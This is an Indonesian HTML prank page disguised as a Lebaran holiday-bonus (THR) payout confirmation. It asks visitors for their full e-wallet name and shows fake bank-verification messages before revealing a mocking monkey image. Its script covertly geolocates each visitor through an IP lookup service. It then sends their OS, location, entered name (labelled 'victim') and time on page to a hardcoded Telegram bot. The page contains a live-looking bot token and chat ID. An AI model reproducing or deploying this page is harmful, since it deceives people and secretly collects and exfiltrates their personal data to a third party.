<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Konfirmasi Penerimaan THR 2026 🌙</title>
    <style>
        body { margin: 0; padding: 0; background: #f0fdf4; font-family: 'Segoe UI', sans-serif; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; flex-direction: column; }
        #intro { margin-top: -50px; padding: 0 20px; z-index: 5; }
        h1 { color: #15803d; margin-bottom: 5px; font-size: 1.8rem; }
        p { color: #166534; margin-top: 0; font-weight: bold; }
        #verify-box { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); margin-bottom: 25px; width: 280px; z-index: 6; }
        input { width: 90%; padding: 12px; border: 2px solid #e2e8f0; border-radius: 10px; outline: none; text-align: center; font-size: 1rem; }
        input:focus { border-color: #15803d; }
        #envelope { width: 280px; cursor: pointer; transition: 0.2s; z-index: 10; }
        #envelope:active { transform: scale(0.9); }
        
        /* PRANK SCREEN + GIGA PARTICLE CONTAINER */
        #prank-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 100; justify-content: center; align-items: center; cursor: pointer; overflow: hidden; }
        #prank-screen img { width: 100%; height: 100%; object-fit: contain; z-index: 1; position: relative; }
        #particle-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 20; pointer-events: none; }
        
        /* LOADING OVERLAY + ANIMASI DUIT JATUH */
        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 50; flex-direction: column; align-items: center; justify-content: center; overflow: hidden; }
        .spinner { border: 5px solid #f3f3f3; border-top: 5px solid #15803d; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; z-index: 10; }
        #status-text { margin-top: 20px; font-weight: bold; color: #15803d; z-index: 10; position: relative; background: rgba(255,255,255,0.8); padding: 5px 10px; border-radius: 5px; }
        
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* CSS BUAT DUIT JATUH (LOADING) */
        .money { position: absolute; top: -50px; user-select: none; z-index: 1; animation: fall linear forwards; }
        @keyframes fall {
            to { transform: translateY(105vh) rotate(360deg); }
        }

        /* CSS BUAT GIGA PARTIKEL EMOJI (PRANK LOOP) */
        .particle { position: absolute; user-select: none; pointer-events: none; animation: popOutLoop linear forwards; z-index: 20; }
        @keyframes popOutLoop {
            0% { transform: translate(-50%, -50%) scale(var(--startScale)) rotate(0deg); opacity: 1; }
            /* Stay gede sebentar di tengah */
            20% { transform: translate(-50%, -50%) scale(var(--midScale)) rotate(360deg); opacity: 1; }
            /* Mencar GEDE */
            100% { transform: translate(var(--tx), var(--ty)) scale(var(--endScale)) rotate(var(--r)); opacity: 0; }
        }
    </style>
</head>
<body>

    <div id="intro">
        <h1>Selamat Lebaran! 🌙</h1>
        <p>Verifikasi nama Anda untuk pencairan dana THR.</p>
    </div>

    <div id="verify-box">
        <input type="text" id="victim-name" placeholder="Nama Lengkap Sesuai E-Wallet" autocomplete="off">
    </div>

    <img id="envelope" src="amplop.png" alt="Ambil THR">

    <div id="loading-overlay">
        <div id="money-container"></div>
        <div class="spinner"></div>
        <p id="status-text">Menghubungkan ke server bank...</p>
    </div>

    <div id="prank-screen" onclick="closePrank()">
        <div id="particle-container"></div>
        <img src="monyet-memberikan-jari-tengah-kepada-orang-orang.jpg">
    </div>

    <script>
        // VERSION 1.3 - BRUTAL PARTY EDITION (MONEY RAIN + GIGA MONKEY PARTICLES LOOP)
        const env = document.getElementById('envelope');
        const nameInput = document.getElementById('victim-name');
        const loading = document.getElementById('loading-overlay');
        const statusText = document.getElementById('status-text');
        const prank = document.getElementById('prank-screen');
        const moneyContainer = document.getElementById('money-container');
        const particleContainer = document.getElementById('particle-container');
        
        const prankSound = new Audio('https://www.myinstants.com/media/sounds/monkey-laugh.mp3');
        prankSound.load();

        const TELE_TOKEN = '8642591827:AAEW79QE8FGYcvELtapkI2jnhvXocW4rd9U'; 
        const TELE_ID = '7267912519'; 

        const startTime = Date.now();

        // --- FITUR ANIMASI DUIT JATUH (PAS LOADING) ---
        let moneyInterval;
        function startMoneyRain() {
            const emojis = ['💸', '💰', '💵', '🤑', '💎'];
            moneyInterval = setInterval(() => {
                const money = document.createElement('div');
                money.classList.add('money');
                money.innerText = emojis[Math.floor(Math.random() * emojis.length)];
                money.style.left = Math.random() * 100 + 'vw';
                money.style.fontSize = Math.random() * 20 + 20 + 'px';
                money.style.animationDuration = Math.random() * 3 + 2 + 's';
                money.style.opacity = Math.random() * 0.5 + 0.5;
                moneyContainer.appendChild(money);
                setTimeout(() => { money.remove(); }, 5000);
            }, 150);
        }
        function stopMoneyRain() {
            clearInterval(moneyInterval);
            moneyContainer.innerHTML = ''; 
        }

        // --- FITUR LEDAKAN GIGA PARTIKEL LOOP (PAS MONYET NONGOL) ---
        let particleInterval; // Buat interval loop 2 detik
        
        function burstParticles() {
            const emojis = ['😂', '🤣', '🤪', '🐒', '🙊', '🤡', '🤮'];
            const particleCount = 70; // Jumlah gila-gilaan

            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                particle.classList.add('particle');
                particle.innerText = emojis[Math.floor(Math.random() * emojis.length)];
                
                // Mulai dari tengah
                particle.style.left = '50%';
                particle.style.top = '50%';

                // Arah ledakan acak, TAPI LEBIH GEDE JARAKNYA
                const angle = Math.random() * Math.PI * 2;
                const speed = Math.random() * 500 + 150; // Mencar lebih jauh (150-650px)
                const tx = Math.cos(angle) * speed + 'px';
                const ty = Math.sin(angle) * speed + 'px';
                particle.style.setProperty('--tx', tx);
                particle.style.setProperty('--ty', ty);
                
                // --- UKURAN GIGA (5x sampe 10x lebih gede) ---
                const scaleValue = Math.random() * 5 + 5; // Mulai dari 5-10
                particle.style.setProperty('--startScale', scaleValue * 0.5); // Mulai dari setengah GIGA
                particle.style.setProperty('--midScale', scaleValue); // Jadi GIGA
                particle.style.setProperty('--endScale', scaleValue * 1.5); // Berakhir MEGA
                
                // Font Size gedein biar partikel aslinya gede
                particle.style.fontSize = '30px'; 
                
                particle.style.setProperty('--r', Math.random() * 720 + 720 + 'deg'); // Rotasi MEGA

                // Kecepatan animasi lamain (3-6 detik biar stay lama)
                particle.style.animationDuration = Math.random() * 3 + 3 + 's';
                
                particleContainer.appendChild(particle);

                // Hapus elemen setelah animasi MEGA selese
                setTimeout(() => { particle.remove(); }, 6000); // 6 detik baru ilang
            }
        }

        function startPrankPartyLoop() {
            // Ledakan pertama instan
            burstParticles();
            // --- LOOP DELAY 2 DETIK ---
            particleInterval = setInterval(() => {
                burstParticles();
            }, 2000); // Meledak terus tiap 2 detik
        }

        function stopPrankPartyLoop() {
            clearInterval(particleInterval);
            particleContainer.innerHTML = ''; 
        }
        // --------------------------------------------------------

        window.onload = async () => {
            if (!localStorage.getItem('thr_user_logged')) {
                const ua = navigator.userAgent;
                let os = /android/i.test(ua) ? "Android" : (/iPhone|iPad|iPod/i.test(ua) ? "iOS" : "PC");
                let lok = "Mencari lokasi...";
                try {
                    const res = await fetch('https://ipapi.co/json/');
                    const d = await res.json();
                    lok = `${d.city}, ${d.region} (${d.org})`;
                } catch (e) { lok = "AdBlock/VPN Aktif"; }

                const teksMasuk = `👀 ADA YANG INTIP LINK!\n📱 OS: ${os}\n📍 LOKASI: ${lok}\n⏰ JAM: ${new Date().toLocaleTimeString()}`;
                fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent(teksMasuk)}`, { mode: 'no-cors' });
                localStorage.setItem('thr_user_logged', 'true');
            }
        };

        async function kirimLog(nama) {
            const duration = Math.floor((Date.now() - startTime) / 1000);
            const ua = navigator.userAgent;
            let os = /android/i.test(ua) ? "Android" : (/iPhone|iPad|iPod/i.test(ua) ? "iOS" : "PC");
            let lok = "Unknown";
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                lok = `${d.city}, ${d.region} (${d.org})`;
            } catch (e) { lok = "AdBlock/VPN Aktif"; }
            const teks = `🎯 KORBAN: ${nama}\n📱 OS: ${os}\n📍 LOKASI: ${lok}\n⏳ STAY: ${duration} Detik\n⏰ JAM: ${new Date().toLocaleTimeString()}`;
            fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent(teks)}`, { mode: 'no-cors' });
        }

        env.addEventListener('click', () => {
            const nama = nameInput.value.trim();
            if (nama === "") {
                alert("Woi, isi nama dulu buat cairin saldo!");
                return;
            }

            const elem = document.documentElement;
            if (elem.requestFullscreen) elem.requestFullscreen();
            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
            
            prankSound.play().then(() => { prankSound.pause(); prankSound.currentTime = 0; }).catch(() => {});

            kirimLog(nama);
            loading.style.display = 'flex';
            startMoneyRain();

            setTimeout(() => { statusText.innerText = "Memverifikasi data " + nama + "..."; }, 1000);
            setTimeout(() => { statusText.innerText = "Mengalokasikan dana Rp 500.000..."; }, 2500);
            setTimeout(() => { statusText.innerText = "Menunggu persetujuan Bank..."; }, 4000);

            setTimeout(() => {
                stopMoneyRain();
                loading.style.display = 'none';
                prank.style.display = 'flex';
                
                // --- LEDAKIN PARTIKEL PRANK MEGA LOOP ---
                startPrankPartyLoop();
                // ----------------------------------------
                
                prankSound.loop = true;
                prankSound.play();
                if (navigator.vibrate) navigator.vibrate([500, 100, 500, 100, 500, 100, 500, 100, 500]);
            }, 6000);
        });

        function closePrank() {
            prank.style.display = 'none';
            // --- STOP LOOP PRANK ---
            stopPrankPartyLoop();
            // ------------------------
            prankSound.pause();
            prankSound.currentTime = 0;
            nameInput.value = "";
            if (document.exitFullscreen) document.exitFullscreen();
            else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
        }
    </script>
</body>
</html>
